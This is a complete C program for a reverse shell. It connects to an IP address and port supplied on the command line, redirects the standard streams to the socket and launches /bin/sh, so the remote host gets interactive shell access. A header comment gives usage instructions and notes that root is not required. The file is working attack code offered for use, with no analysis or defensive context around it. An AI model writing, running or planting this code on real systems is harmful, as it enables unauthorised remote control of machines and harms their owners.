#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/*
***************************************
This script runs only on LOCAL networks 
---------------------------------------
To run:
Compile &
provide the executable with the following command line arguments:

For the 1-st argument give the ip address of the device to which you want to give
shell access 

For the 2-nd, the port on which the device you want to give shell 
access to is listening 
---------------------------------------
This program DOES NOT requere ROOT access to the device on which it is run
***************************************
*/

int getPort(char *raw_data){

    char *p;
    int num;

    long conv = strtol(raw_data, &p, 10);

    num = conv;

    return num;

}


int main(int argc, char *argv[]){

    if(argv[1] == NULL){

		printf("** NO IP ADDRESS GIVEN");
    	return 1;
  
	}else if(argv[2] == NULL){

		printf("** NO PORT GIVEN");
		return 1;

	}
    
    int port = getPort(argv[2]);    
	
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(argv[1]);

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv_sh[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv_sh, NULL);

    return 0;       
}
